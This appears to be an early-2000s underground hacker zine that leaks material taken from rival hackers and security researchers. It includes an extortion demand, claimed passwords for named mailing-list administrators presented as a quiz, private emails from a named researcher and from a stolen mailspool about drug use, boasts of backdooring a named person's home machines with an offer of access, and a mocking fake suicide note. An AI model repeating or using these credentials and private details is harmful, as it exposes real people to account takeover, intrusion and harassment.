Description ..........: leaks in teso crew
Date .................: 2004/10/01 13:00
Author ...............: h0no
Publicity level ......: underground
Affected .............: teso, mainly scut
Type of entity .......: leak
Type of discovery ....: vulnerability
Severity/Importance ..: high
Found by .............: anonymous teso member

===============================================================================

teso crew contains a leak in their group.

It seems as if teso has been nondisclosure for a very long time.  Of course 
their group consists of mainly blackhats, but there is a few leaks on board. 
It it recommended that teso give up all of their personal warez to h0no, in 
hopes that we will not distribute their vital group information.  Also, as 
a sign of good will, add h0no rux to the ircsnet motd.

     Tripple X, your mission if you choose to accept it is to uncover the 
     secret 9x and global hacker grouping terrorist organisation, the 
     International Underground Alliance (iua)...

     in short, /home/jcat/iua.zip 

---------[BEGIN EXAMPLE OF THE CONTENTS]-------------------
The International Underground Alliance

Mission: To bring the H/P scene back to its former strength and skill level- and
 beyond.

Problem: The H/P scene is fading.  Where the true H/P'er fades away a newbie AOL 
-~-~-~ d00d i use AOL AND I ()WNED YOU! -~-~-~
 script kiddie comes to take his place.  These kids multiply on an insane level.
-~-~-~ talk about MAD sk1llz -~-~-~
  In the old days H/P'ers (who I will just refer to as Hackers from here on out)
 used to  share just about any information they came across.  This led to vast k 
-~-~-~ until we g0t raided for it. -~-~-~
nowledge amongst Hackers, so great of knowledge that corporations and organizati
ons world wide soon came to fear the H/P scene.  What they did was impliment law 
s and hire their own white hats for protection.  Thanks to this, any information
 a Hacker shared would quickly be scooped up not only by some script kiddie, but
 the feds and the very corporation or organization the Hacker had discovered the
 information from.  For this reason Hackers generally no longer share info.      
 -~-~-~ well not to you, your box had no 0day. -~-~-~

Background:  The IUA was founded in 1998 as a group of groups and other major en 
tities in the H/P scene for the purpose of organizing sheer power.  Shortly afte
r, it was realized this power could do more than 0wn lamers; it could make the s 
-~-~-~ the p0wer oh the p0wer! -~-~-~
cene right again.  It was seen that the scene was fading due to nobody sharing i
nfo, and of course to the gargantuous numbers of lamers flooding in, thanks grea
tly in part to the overwhelming success of the Hacker ideal of 'information shou
ld be free'.  Point and click tools to devastate global networks were developed
-~-~-~ FUQN WINNUKE Y()! CRASH THE WORLD! -~-~-~
by elite Hackers, and being that information should be free, it was shared with
the world.  Well, it worked for a while, but this can't go on any longer.  The I
UA is here now.                            

The premise:  If Hackers were to share information freely, it would have to mean
 they could do so without the fear of it getting out to the feds, lamers, and or 
 -~-~-~ you have no 0days.. the lamers -~-~-~
ganizations (and ESPECIALLY organizations of lamers).  Well as sad as it is to s
-~-~-~ have more 0day than you... -~-~-~
ay, not even if every "Elite" in the world joined up with the IUA would we ever  
have enough power to annihilate all of those.  So here's what's being done...    
-~-~-~ you cant annihilate shit... -~-~-~

The fix: A network based on the United States militarys own Secret Internet Prot
ocol Router NETwork (SIPRNET) is being created to form a vast, secure, compartme
-~-~-~ uh0h, i sense a gov linkage... -~-~-~
ntalized BBS-like safe haven for Hackers.  This is a fully functional network; m
eaning WWW, Telnet and everything else will work... peer to peer anyways.  As fa
-~-~-~ tin cans and string!?! YAY! -~-~-~
r as communicating with the regular Internet goes I think anybody with any amoun
t of skill can safely handle that manuever.  We're also dabbling in the idea of
an anonymous link to the Internet using Onion Routing.                          
-~-~-~ ideas ... ideas... since 1998 -~-~-~

The pros and cons:  The biggest pro I can think of has all ready been mentioned;
 we will have a safe haven to reform and unite the H/P scene in order to grow li 
ke we once did.  Due to feds, lamers and orgs having our info on a 0-day basis o 
ur tactics and skills have been matched.  This is unsatisfactory; we used to rul
e the Internet, and it should be that way still.  Not only have we been matched, 
-~-~-~ how could you rule the internet? -~-~-~
 but in most cases surpassed.  The biggest con is the fact that we will have a c      
 -~-~-~ at least the mil patches its kernel.. -~-~-~
entralized location for sensitive information- making us a target for interested
 parties like authoritive agencies.  Also, since this Alliance is comprized of t
he most elite in the world we will also be a target for lame kiddies trying to p 
rove something.  There are at least a hundred pros and cons I can think of like
the ones above, but it seems as if all the cons, with a little work, can be over
come.  Most of them at least- the "insider" risk will probably always be evident
, but all I can say is with enough support from the worlds greatest Hackers, who
 in their right mind would want to fuck with us?  Also, in another light, the fe
ds might even leave it alone... at least on a full frontal attack stand point.

If we were to create this network and keep all new information to ourselves, the
n the malicious hack attack percentage would drop around the world to almost nul
l.  That's something agencies can appreciate because big wigs will take credit f
or the drop; so be it.  What would people rather have; random murders, robbings
and gang violence, or some organized mobster action that might murder once in a
while?  I think the latter, for lack of a better example.


Details are being worked out, pros and cons are being discussed.  Do's and Don't
's, Right and Wrong's and everything else between is being brought up in #IUA on
 EFNet.  I invite you to join and share your comments, questions or concerns and
 mostly ask for your support.  Without a vast number of skilled individuals this
 can never become a reality.  As lame as it sounds I ask you to stay in #IUA and
 idle if you must to show your support.  With a few we can encourage many, with  
 -~-~-~ so theres the secret hangout! :) -~-~-~
many we can accomplish anything we want.

Oh, and keep this to yourself... there's a reason why you were personally invite
d instead of seeing this text blasted across the net.

Broadcasted Rolling Encryption And Scrambled Transmission System

Broadcasted: Using a military technique known as OTAR, or Over The Air Rekey, 
             the encryption key is sent out over the network to its trusted 
	     systems/users for an automatic update.

Rolling:     The rolling, or updating, of the encryption key will be at random 
             intervals but within set parameters; say twice a day at random 
	     times.

Encryption:  Our encryption type is still undecided, but it shall be strong 
             encryption
             --military grade 1024bit.

And:	     In addition to broadcasted rolling encryption, the actual data, 
             after being encrypted, will follow a scrambled transmission 
	     scheme.

Scrambled
Transmission: The scrambled transmission system will allocate actual data 
              transfering
System        across the network into groups of packets.  Using start and stop 
              packets much like start and stop bits work, we can scramble the 
	      transmission after it has been encrypted; achieving a type of 
	      dual encryption.  Taking these groups of packets, for example a 
	      series of 5 packets, we can perform a method of scrambling it 
	      from a 12345 In Order series into a 52341 Scrambled series of 
	      packets.  Start and stop packets will inform the system when and 
	      where in the data transfer to engage the descrambling code.  The 
	      scrambling/descrambling code will be a seemingly random, but set 
	      code based on another military technique called WOTD, or Word Of 
	      The Day.  WOTD will be a database of randomly generated 
	      scrambling code where each piece of code, or rather each scramble
	      (ie 52341 would be one and 14235 would be another etc), will be 
	      given a code word.  The WOTD will also be rolled in and 
	      transmitted in sequence with the encryption key using the OTAR or
	      "Broadcasted" scheme.  Naturally the encryption key and WOTD 
	      databases will be considered "Top Secret" and thus hidden the 
	      best way possible and known only to the developers of BREASTS and
	      necessary network administrators.

Notes:  In order for the OTAR/Broadcasted system to work, since it broadcasts 
	the updated key to all systems and users, they would have to be 
	connected to the network at the precise time the rolling is taking 
	place.  This is not going to happen in all cases.  To work around this 
	issue the OTAR still takes place, however for those systems and users 
	that are not connected we will have in place a certification and 
	blacklist system.  Systems and users will have a certificate, where each
	certificate is unique and cataloged with an identifier for administrator
	use.  The reason for this is so if we decide to blacklist somebody all 
	we have to do is blacklist that certificate.  In addition to being the 
	"key" to the network, the certificate will validate whether or not the 
	user has access to get the OTAR updates.  Blacklisted certificates will
	not get the updated crypto key or WOTD.  Being that the rolling 
	sequence will take place a couple times a day the margin for 
	blacklisted intruders to do any damage is minimized by not only will 
	they be "k-lined" from the network upon administrators blacklisted their
	certificate, but once the roll occurs they will be automatically 
	"d-lined".  Like I was saying about users not currently connected to get
	the OTAR updates... a non-blacklisted certificate will be enough of an 
	endorsement for that system or user to initiate an automatic Special 
	OTAT request.  OTAT, or Over The Air Transfer, is another military 
	technique which is nothing more than an unscheduled OTAR.  Naturally 
	there will be a limit as to hold "old" the certificate can be.  If a 
	user or system has not logged onto the network and received an 
	encryption/WOTD update in oh, we'll say 14 days, then that certificate 
	should be considered Red Flagged.  The Red Flagging system will be 
	automatic. The system will keep track of which certificates were last 
	updated and if a certificate reaches the 14 day limit or whatever limit
	we deem suspect, then it will be Red Flagged within the system.  Once a 
	Red Flagged certificate performs a handshake with the network and 
	attempts to request a Special OTAT, that certificates system will be 
	kept in "limbo" and not granted access to any network functions or 
	updates.  Simultaneously a message will be broadcasted to all 
	administrators, informing them a system or user is in limbo due to being
	red flagged.  At that time any administrator can respond after 
	investigating who this certificate belongs to, and after making a 
	judgement call can either blacklist the certificate, at which time the
	limbo certificate system will be k-lined and then d-lined after	the 
	next update roll, or it will be granted the Special OTAT request and 
	consequently allowed its previous access to the network.  The only real
	flaws in this system are that A.) what's to keep users from handing out
	their certificates, and B.) what if a user gets arrested/detained and 
	their computer gets confiscated.  Well, when somebody finds a way to 
	keep an insider from potentially doing any wrong I will show that 
	person the door to millions of dollars.  In addition we possibly have 
	a C.) the BREASTS system might drastically slow down the system, but 
	we won't know until we test it.

04.txt-~-~-~ who wantz to win an 0day?

Hello and welcome!  This is h0no's first episode of the new smash 
hit 'who wants to win an 0day?'.  I am your host, rm slashbin.  
To start things off today's questions focus on mailing list 
administration, so I hope you got your qmail secured.  The game 
is simple.  We ask a question, give the 4 multiple choice 
answers, then let one of you, our worshiping home readers pick 
between them.  If they get all of the answers correct they will
recieve an 0day for dimeware...  I hope you excuse our shitty 
prize, ADM's had a slow half-decade.

rm slashbin:
Our reader today is bx.  He hails from shcrew and currently 
denies every coding in his life.  He is also known to change 
his isp often, in hopes that the onslaught of DDoS attacks 
will one day end.  His main goal in life is to trade in his 
shells for a shiny badge and join the likes of k2 as a fed. 
Sounds like he's a winner already!


rm slashbin: 
Here is our first question.  Please listen to all the possible 
answers and as always if you think you need help you may use a 
lifeline.

Question #1
What is the admin password to osx-security-bounces@lists.joshie.com?
A) passwd          C) 123456
B) hvacm28         D) Maria1245567sxi


bx:
Well, my password is C, and I know darkacid's is D.  osx, that is 
based off of fbsd...  so I'll say B!  The answer is B rm.

rm slashbin:
Good answer, B was correct.  I like how it is alphanumeric, yet 
not a dictionary word.  On to the next round.

Question #2
What is thegnome's password to the widdershins list?
A) f@tg0th         C) ikazba
B) HP&I            D) qwerty

bx:
mmmmm. I am not too fimilar with widdershins list.  I know 
thegnome is in nmrc, and they like plain text passwords.  So it's
between C and D.  qwerty is just to obvious...

rm slashbin:
We need an answer.

bx:
ARGGGGHH!!! this one is tougher to detect than my SH-crew rk!  I'll 
take a wild stab and say C.  ikazba.  Final answer.

rm slashbin:
... ... ... SH KIT, buhahahahhaa.
... ...
...
oh yea, C. That's right.  On to round 3.

bx:
Holy shit!  I can taste the warez!

Question #3
ecgaov is jeff@barrows.net's password for what whitehat mailing 
list?
A) cissp@fireflynetworks.net C) narcs@l33tsecurity.com
B) porno@whitehats.com       D) core@english.noops.org

bx:
C is only for me, icer, and my good buddy atomix.  And D is 
for wanna be security professionals like kf.  This jeff guy 
seems like the real deal.  Maybe he'll give me a shell on 
fireflynetworks.net.  A.  My final answer.

rm slashbin:
Correct.  And btw, jeff is an admin there.  Round 4 comming 
up!

Question #4
info-sec-bounces@mailman.acomp.usf.edu's admin is campoe@usf.edu.
What is his password?
A) GED         C) soudez
B) FBI         D) qwerty

bx:
I'd like to use a lifeline.  I'd like to phone a friend.

rm slashbin:
you fucking lamer.  Who would want to talk with you?

bx:
;(
I'll call awk, he's an old #darknet buddy.  I'll split the 0day
with him.

*RING**RING*

awk:
GRRRAWLL, I EAT PROTEIN, EGGS & STEAK, GRAWWLL

bx:
Hi awk.  I love you.  You helped make hack.co.za my central wget
haven.  And now I need more of your help.

awk:
ARGHS, YOU ARE BIGGER LEACH THAN ME. GOV-BOI DOESNT SHARE WITH ME 
ANYMORE.. AND NETHER DO YOU!@#$!@#

bx:
I dont have anything but this DoSoSoS-pirc.mrc ;(
Since awk's name starts with an a, and mine with a b, I think I'll
go with C.  my final answer.

rm slashbin:
oh shit. with awk out of your dcc auto gets how are you ever 
going to own anything bx?  Wait, C is the right answer.
Now you are just 1 more question away from the warez!

Question #5
Who's password is tumuxa?
A) jericho's @ the narcs list.     C) jericho's @ the gayz list.
B) jericho's @ the attrition list. D) jericho's @ the abc list.

bx:
I know this one! I know this one! It is B.  jericho isn't on 
any of the other lists!!  Final answer! Final answer! Give me 
the warez! #darknet here I come!

rm slashbin:
Well I'll be fucked.  Your dumbass actually did it.  You've 
guessed and leeched your way passed all 5 questions.  Damn, 
maybe they'll let you back into #blackmarket with this victory.
Here you are, your warez.

What The Fuck! I worked on that exploit for over a month!  But I 
lost in in my last rm'ing.  Good thing people like dvdman leave 
their shells wide open.  It looks like he may have added another
target.  I'll have to bring this back to the icerslair lab for 
research!  Thanks to h0no I'll be #1 op in #darknet for the next
week!  Watch out nolife!  Here comes the l33tsecurity warez!!

     are trying to Hack here!!!

As i had cat'd the pass file from his linux box, i attempted to find other 
users who were awakeon dioad's shell that would like a win32 shell, after all, 
in 45mins SP1 will be installed...

*** cyb has been idle 1016 minutes, signed on at Wed Nov 12 01:38:02 2003

Damn, i guess not...

------ And that was the end of di0aD and his mum's box...

Till next time!

-------------------- THE FINAL CHAPTER!!!!

After a while, it became apparent that di0ad was in denail of his box being 
owned, needless to say it was subsequently do_brk()'d and backdoored - to this 
DAY it still remains backdoored....


if you have a shell on di0ad's dsl connection and require access to either his 
mom's system or his home system or hell, even his DSL router, just ask in 
#darknet (h0no's offical channel)...

This idiot idles in #phrack.  Probably waitting for warez info to leak to

Subject:	Re: security audit job.	
From:	"Tom Ferris" <tommy@security-protocols.com>

Hi James,

Well, to give you a readers digest of my career.  I currently work for
eEye Digital Security, and have been here for over a year now.  I am a
research and development engineer.  I code all of the vulnerability 
checks for our VA product called Retina.  I have allot of experince with 
Windows, Linux, SunOS, HP-UX and other flavors of UNIX.  I also reverse engineer
products to find vulnerabilities which can be exploited.  Before 
working at eEye, I also work for Foundstone as a r&d engineer for over 2 years.

Prior to Foundstone, I work for the DoD doing pen testing.  So I have 
been in the business for over 7 years now.

So, I defintly have the experince to do a quality pen test job.  I can 
do a pentest on your internal network, and or external network to see what
you have exposed.  From there I will compile executive reports on what
machines are vulnerable and how to fix them.

Also, I am the founder of www.security-protocols.com which is security
portal site.  So if you could, please give me more details on the 
pentest job.  Location, how many hosts to scan, external scan, internal scan...

Thanks for your time,

Tom Ferris
Founder
www.security-protocols.com

Hi James,

30 machines should be a snap!

eEye Digital Security:
- Research publicly released vulnerabilities and find a way to remotely
detect them using Retina Security Scanner.
- Reverse engineer .dll's, and other binaries to find commonly 
exploitable bugs.  If a bug is found, code a proof of concept exploit to 
reproduce the problem.
- Work with clients to do customized vulnerability/pen testing scans 
for there network.  Upon finding vulnerable machines, compile a fix-it report.

Foundstone:
- Research publicly released vulnerabilities and find a way to remotely
detect them using FoundScan.
- Reverse engineer .dll's, and other binaries to find commonly exploitable
bugs.  If a bug is found, code a proof of concept exploit to reproduce 
the problem.
- I would get pen testing assignments for banks, credit unions and 
other large financial networks.

DoD:
I am not able to disclose anything that I have worked on.  But I can 
say that all I did was "Red Team" pen testing.  I would basically be given 
a list of IP addresses, and was told to see "how far you can get in".  I
would then help close the holes which were found in the network.  I did
this for 2 years.

I have also done many pen testing jobs for local banks and credit 
unions in my area.  They mainly had BSD and SunOS machines.  I have also coded
all of pen testing tools which help automate allot of scanning process,
making the job very fast and accurate.

I have been coding vulnerability checks for 2 of the most widely used 
VA products for over 3 years now.  Coding these checks require extensive
knowledge of vulnerabilities which affect all operating systems.

So, you said you worked for www.bee-net.com?  I was looking at the 
site, seems like a nice company.  Are you guys located in Japan?

Well, if you would like to make an offer on this job let me know.  I 
would be more than happy to work with you in getting your systems locked 
down. You have defiantly came to the right person for the job.

Please keep all of this information regarding myself confidential.

Thanks,

--Tom



08.txt-~-~-~ iCER & darkacid` secret lives revealed

This is the owning of a lame shell whore named iCER.  This 'hacker' has a 
brother who does the dirty work, although it is believed they may be the same 
person.  His nick is darkacid.  They are both dumb as shit.  I didn't know it 
took skill to be an irc whore.

Not only is darkacid dumb as shit, but he is a spammer, irc warez channel whore
and #darknet resident.  He uses darkacid nick to DDoS people and rip them off in
exploit trading.  All his exploits are over 7 months old public codes.  He even
has his own email addresses in his spamming file.

10 bonus points for those who noticed the termcrew connection between this hack
and the hex69 one.  They were unrelated besides the fact that both of these 
bitches dont have any good warez.  bx, you're next.

Careless hacks, no warez, partners with an irc channel takeover crew, DDoSes 
people, rips people off on exploit trading, and spams.  What a supreme hacker 
resume!

This rm is for that spamming fuckwit darkacid, and don't ever think of DDoSing 
again.

10.txt-~-~-~ dvdman suicide note (0day giveaway extravaganza!)

Forseeing Dvdman's suicide we have gotten ahold of his deathletter.  
We feel this ring of exploit tradersneeds to be broken up.  Their 
blackhat is whitehat attitude should not be tolerated any further.

------
I am sorry that I was owned.  I am sorry that everyone and their mother 
knows the size of my bent penis.  I am sorry that I was a kiddie who 
leached off of others.  I cannot express my lameness in such a short 
letter.  This is the worst week of my life.  On monday, a h0no member 
contacted me and told me of their plans.  I tried to bribe them with 
the hack.se tarball from 5 years ago.  Then I sent them 0days from sam`.
Although sam` is my #1 warez hookup, I do love to trade his grade A 
exploits for fakes with random darknet visitors.  And for this, I leave 
sam` with complete control over the l33tsecurity.com domain.  He loves 
his bnc on team.l33tsecurity.com, well now sam`, you are l33tsecurity.
To my friend flatline, who has taught me so much I give all my HPUX 
exploits that dont work (I hope you can get them to work on some .kr 
boxes).  And to bysin, A loyal l33tsecurity member, I leave my collection 
of over 300 dvds and my 19" rims I got from super k-mart (I had to sell 
3 of sam`s exploits to snosoft to pay for them!)  I hope your mailing 
address in florida still works.  To the ex-member of l33tsecurity, ech0, 
I leave my efnet-channel-keywords.txt file.  Now he can join the best 
in the security world and leech warez like I always did.  For my dear 
friend crg, I leave you the src to solaris 8, I hope you have the hd 
space to give it a nice home.  Make sure to distro it as much as I did!
To my beloved friend, ron1n, I have always looked up to you.  Yes, I did 
make up alot of things I told you, but I hope you saw through my lies 
and know that it was just my way of trying to impress the turkey.  I 
leave my new fbsd kernel exploit.  There are no NDAs where I am going ;(

I hope all of EFnet can accept irc life without me.  Dont cry when I 
/quit.  I knew all along that my online sex addiction would catch up 
to me some day.  It was only a matter of time before someone alerted 
my mother of my actions and I would have to wonder the streets of new 
york begging to do html for food.  The h0no has promised if I sent them 
this suicide note that they would spare dropping my dox.  I am sick of 
the prank calls, and frankly, you are not funny.  I hope someone owns 
you someday and you start lossing hair from the stress of multiple ownings.

ps to RaFa, fuck you and nrml.  How dare you own me you kiddie!

Keep darknet alive!

	Yours truely,
	Digital Video Disc Man.

12.txt-~-~-~ ihaq4weed mailspool

Only thing good in this shit is his passwords and have a laugh at how big 
the druggies in the b4b0 gang are.  His shell had shit on it, and is now 
/bin/false'd for letting some .pl hackers try to root bur.st, but we 
redirected his email to our hush account.  At the end is his .fetchmailrc
with some passwords he uses.  This is the last warning for b4b0 fucks, 
You join h0no or be /bin/(false|rm)'d aswell.

Re: Dramamine, never had it, keep me informed if its any good!

The rumours are true to an extent. I don't drink anymore, besides like 
1-2 beers/glass of wine and I don't take any chemicals. I do, however, 
grow weed, opium poppies and am just starting to sprout san pedro cacti. 
Next on the agenda is my own psylocybe mushrooms. 

The cunts im hanging out with here are mostly cr, he is fucking cool he 
just hates everyone so everyone hates him back, and people I know through 
the jungle scene. I'm doing jungle MCing every week so I know lots of 
them. I haven't seen fos since that incident at some guy's house where 
they got drunk and fos pulled a knife and it made me pretty nervous.

So does majere live in brisbane now or something? I'd hardly say i'm doing 
well, I smoke too much pot and I don't reach my full potential because im 
so lazy and forgetfull.

hi,

i just came across you site and am interested in ordering some 2ci
(http://www.americanchemicalsupply.com/2ci.htm). i live in australia and am
not
sure of the legality of 2ci for importing. i checked out
http://www.health.gov.au/tga/docs/html/bringmed/apendixb.htm and
2,5-Dimethoxy-4-Iodophenethylamine HCI isnt on the list so i assume i would
hae
no problems. have you guys had or heard of any problems with australian
customers buying 2ci before ?

thanks

<P>You cranky shit.</P>
<P>I dunno if there was speed. They felt chargy, but kinda rough. I was shaking
a bit, movements felt fast and jerky instead of smooth. I was a bit clumsy, and
had&nbsp;to concentrate on walking for a while. I couldn't sleep, or eat&nbsp;
the next day. I felt like walking and shit, but music didn't really affect me. 
Usually I can't help dancing around. It didn't feel emotional at all. No 
loved-up feelings.Dunno. Found a new hookup somewhere along the way, so I at 
least I won't have to buy them again.</P>
<P>About Paul... fuck, I dunno. I just thought it was weird since he didn't 
have that much to drink, and hadn't taken anything else. He didn't think it 
was speed or ecstasy. He just... man, I dunno. Maybe he was saying it to save
face or something. We were just a bit worried because there were ambulances all
over the place that night. Haven't heard anything since, though.</P>
<P>Tim and I hit up again yesterday (Tim didn't come out on Saturday night. 
It's his birthday tomorrow, so we wanted to celebrate early.) We got some beers
on the comedown, then Gavin came over for a while. I went to bed pretty late, 
and I still hadn't slept since the night before.</P>
<P>I had to work today at 9:00. I was dreading it, but I actually felt better 
than usual. I don't have to work tomorrow, so Tim wants to go on a pub crawl for
his 20th. I think Gavin might be going too.</P>
<P>Timmy G turned 25 yesterday. Poor thing was on call and got called out for a
job later that night. </P>
<P>I dunno what the name of nanna's pills are. Maybe mum has some xanax stashed
away somewhere. I'll ask, and of not I'll find out the name of the new stuff. 
They're anti-depressants too. They had to take her off xanax because there's 
regulations about how long and how often she's had prescriptions. Don't know the
details.</P>
<P>I hope my 5htp arrives tomorrow. I want them for this weekend. When I got 
home from work I was hoping they'd be there, or at the PO, but instead there was
just new TAFE work. Nice.</P>
<P>Oh, hey guess what? The big mouse bit Tim on the finger and chucked food at 
him yesterday. Couldn't believe it. He's such a little legend.</P>
<P>You doing anything for easter? I'll probably be on my arse from the night 
before again. Should be fun. Anyhow...</P>

&gt; Oooohhhhh maaaaan I'm a scatter-monkey today. Haven't slept yet. Fuck. 
<BR>&gt; &gt; <BR>&gt; hahah sometimes my work hours get so fucked i end up 
being up for 3 days <BR>&gt; str8. nothing like sleep deprivation to get me 
tripping and disassociative <BR>&gt; (is that even a fucking word ?) <BR>&gt;
<BR>&gt; &gt; Dunno if I could get more xanax. They've taken nanna off it and
started <BR>&gt; &gt; her on something else. The bit that I had the other night
was all I had <BR>&gt; &gt; left. I'll see what I can do. <BR>&gt; &gt; <BR>&gt;
damn. im in dire need of somthing that will rescue me form the depths of 
<BR>&gt; OD. hrm whats the new stuff shes on ? if you find out the name i can 
tell <BR>&gt; you whether its gold or not! hehe <BR>&gt; <BR>&gt; &gt; Man, ano
 ther good night. Paul reckons his drink was spiked. He was so <BR>&gt; &gt; 
 out-of-it for a while that he couldn't walk or stand. He looked really <BR>&gt;
 &gt; pale and stuff. <BR>&gt; &gt; <BR>&gt; erm, was he on anything ? kinda 
 getting sick of ppl saying they have had <BR>&gt; their drinks spiked. its not
 a common thing at all, and who the fuck <BR>&gt; spikes ppls drinks with mdma 
 and speed, ike point me in their direction! <BR>&gt; ill get spiked no worries
 then. free drugs rule. <BR>&gt; <BR>&gt; spiking allegations usually happen 
 when someones ego is bruised. ie they <BR>&gt; got more drug then normal off 
 alchol. theres a lot of factors that go into <BR>&gt; your tolerance with 
 alcohol. not just strengh or drink and amount drunk. <BR>&gt; paul could of 
 been dehydrated from work and didnt even know!@ he could <BR>&gt; have a slight
 immuno deficieny atm due to it being flu season. <BR>&gt; <BR>&gt; &gt; 
 Different pills. These ones are loaded with speed. Ended up taking
  3 last <BR>&gt; &gt; night. Oops. I was talking to Adam Mitchell for hours 
  and hours. I reckon <BR>&gt; &gt; we walked around the town at least 3 times.
  Mmm chargy. <BR>&gt; &gt; <BR>&gt; loaded with speedy ? who told you that ? 
  dont trust ppl when they say that <BR>&gt; shit, it was more likely a 
  combination of MDE and MDMA producing a speedy <BR>&gt; effect. like seriously
  do you think its possible to put a point of meth in <BR>&gt; a pill? no way, 
  not to mention that a point of meth is worth more then a <BR>&gt; pill! lots 
  more! <BR>&gt; <BR>&gt; sorry if i sound angsty but ive had so many ppl 
  lately telling me all <BR>&gt; about pills with herion, speed cut with fine 
  glass to get you more high, <BR>&gt; and of course the old weed laced with 
  acid has been told to me twice in <BR>&gt; the last week. fucking really 
  annoys me cause if theyd just listen ot a <BR>&gt; educated person on the 
  topic (ie me) then they would know its all crap and <BR>&gt; they would stop
  spreading
  this false info onto ppl. i got a guy tell me <BR>&gt; that the last batch 
  of biege a's going around contain herion and 6 (!!) <BR>&gt; ppl died in the
  valley (place with clubs in brissy) over the weekend. i <BR>&gt; nearly 
  punched this didckhead in the face. seriously how are you gonna fit <BR>&gt;
  25mg of herion into a pill, then OD on that 25mg. fuck off to them all i 
  <BR>&gt; say. just wish ppl would listen to me.... <BR>&gt; <BR>&gt; oh if 
  paul or you or anyone think sthey have been spiked or given <BR>&gt; something
  other then thye were told it was RING ME STRAIGHT AWAY. i can <BR>&gt; 
  organise a urine test to be done within 10hours. you guys have really <BR>&gt;
  gotta get a marquis test kit. if you send me the $$ ill get one and post 
  <BR>&gt; it down (ive got cheap hookups for $25 kits) they are really simple 
  to use <BR>&gt; and its worth saving lives over. <BR>&gt; <BR>&gt; &gt; Fuck.
  <BR>&gt; &gt; <BR>&gt; indeed. <BR>&gt; <BR>&gt; &gt; Lisa <BR>&gt; &gt;

<P>What a messed up weekend. I started chasing on Thursday, and I still haven't 
scored any pingers. I've tried about 7 different places. I can't believe dealers
have holidays off as well.</P>
<P>Friday night we had a BBQ. Then we went out to a few pubs and stuff. Candace 
came, but ended up staying at another guy's place instead. Paul wasn't real 
happy.</P>
<P>Saturday night I went over the road to Adam's place. Just got very, very 
drunk and laughed at stupid shit. Yesterday Adam came over and we were all
just trying to get out hands on some pills. Ended up drinking a carton of 
Woodstocks while we were waiting, but it all fell through in the end anyway. 
Today I've been trying again, but if I don't get them soon I'm not gonna bother.
I have to work tomorrow afternoon, and I don't wanna be messed up and scattered.
My 5HTP should arrive tomorrow morning, though, so maybe it'd be ok. That's if 
I can even get the damn pills... Dunno. Adam has to work too, so I doubt he'd be
that keen, and I don't wanna peak out by myself. Tim spent his pinger money on 
McDonald's. Silly monkey.</P>
<P>We started the Pub crawl on Tuesday, but ended up scoring pingers and jumping
around at home instead. How come when you don't even really want them, you can 
get them? And then when you want them bad, you can't? Insane. Yeah, I'm kinda 
frustrated at the moment.</P>
<P>Hmmm. Hopefully it'll work out. If not... always next weekend, I guess. Heh.
</P>
<P>Lisa</P><BR>

damn. im in dire need of somthing that will rescue me form the depths of

erm, was he on anything ? kinda getting sick of ppl saying they have had
their drinks spiked. its not a common thing at all, and who the fuck
spikes ppls drinks with mdma and speed, ike point me in their direction!
ill get spiked no worries then. free drugs rule.

spiking allegations usually happen when someones ego is bruised. ie they
got more drug then normal off alchol. theres a lot of factors that go into
your tolerance with alcohol. not just strengh or drink and amount drunk.
paul could of been dehydrated from work and didnt even know!@ he could
have a slight immuno deficieny atm due to it being flu season.

loaded with speedy ? who told you that ? dont trust ppl when they say that
shit, it was more likely a combination of MDE and MDMA producing a speedy
effect. like seriously do you think its possible to put a point of meth in
a pill? no way, not to mention that a point of meth is worth more then a
pill! lots more!

sorry if i sound angsty but ive had so many ppl lately telling me all
about pills with herion, speed cut with fine glass to get you more high,
and of course the old weed laced with acid has been told to me twice in
the last week. fucking really annoys me cause if theyd just listen ot a
educated person on the topic (ie me) then they would know its all crap and
they would stop spreading this false info onto ppl. i got a guy tell me
that the last batch of biege a's going around contain herion and 6 (!!)
ppl died in the valley (place with clubs in brissy) over the weekend. i
nearly punched this didckhead in the face. seriously how are you gonna fit
25mg of herion into a pill, then OD on that 25mg. fuck off to them all i
say. just wish ppl would listen to me....

oh if paul or you or anyone think sthey have been spiked or given
something other then thye were told it was RING ME STRAIGHT AWAY. i can
organise a urine test to be done within 10hours. you guys have really
gotta get a marquis test kit. if you send me the $$ ill get one and post
it down (ive got cheap hookups for $25 kits) they are really simple to use
and its worth saving lives over.

13.txt-~-~-~ 2fast2furious virus

I, james horganbe, the great security researcher have caught this virus in the 
wild.  It is owning everything.  It has already owned multiple gov's, ADM 
members, eeye clients, and even the great cDc.  It even owned me, grr, I am 
still pissed.  Now this thing has got my attitude raging, I need my pills.

This code is more crazy than mray and his mailbomber mirc script.

I am an user from EFnet (irc-network) and we traced a few drones on there 
(kaitens) we ended up on this server, and we found the username/password for the 
shell acces please take a look at the directory .a/ the files for the drone are 
located there We have something setup that will kill the bot when it acceses the
channel on irc.

I would advice you to check for rootkits or to reinstal this box, it is 
obviously
compromised.

If you need more information about this matter contact me on EFnet my nick is
Phillip

We are gonna contact your isp to to warn them about this matter.

                                      *** Reflux Security Private Shell Box ***

Rules...

1. No DoS/DDoS from this box or your account will be REMOVED.
2. No trying to hack this box or your account will be REMOVED.
3. No considerable amount of distrubance to this box or any other box or your 
   account will be REMOVED.

Nmaping is not allowed because it, for some reason, takes up too much bandwidth,
sorry.

Quota's for all accounts are 200MB, considering the harddrive is <= 80GB =).

Shell hopping IS allowed.. but please DO NOT get me in trouble. I am trying to 
be a nice guy and give some privledged people free shells here.. DON'T make me 
regret it.

Coding, code auditing, debugging, etc, are encouraged on this box =P.

BNC's are allowed.. but if you even think there is a possiblity of getting me 
DDoS'd.. FORGET IT!

Bots are allowed.. but follow the same rule as with the BNC.


Above all else.. be good and have a nice stay! =D

I guess I've been wrong all my life, but so have billions of
other people...  Certainty is just an emotion.

Let's check up on what the leader of reflux has been up to..
First off, he put way to many unknown users on his box.  This lead to people 
trading all the code that was on it.  Some of this code way by a group called 
m00.  They made an exploit of theirs public because it was traded so much 
by tal0n's friends.  Then a week later r4t gave tal0n a shell account on his 
machine and told tal0n to respect the law from it.  r4t caught tal0n scanning 
random ips from it, but tal0n claimed it was his own machines he was scanning..
r4t let tal0n stay, but gave a warning not to scan or attempt to hack any boxes.
Another few days pass and r4t got a letter from the canadian government saying 
that his machine was scanning the .gov ip range.  guess who was behind that 
brainy move?

lying to your friends about your illegal actions..
scanning .gov from your friend's machine..
sharing friend's private code with unknown people..
giving me the login to his friend's account on reflux.dyndns.org box..
telling everyone he is 21, when he is 16..
saying he is in college, yet his resume only consists of skills in html..

conclusion: tal0n really is truthful friend!



back to the axe'ing...
14 users of r4t's wglabs.com (different box than www.wglabs.com) get the axe.

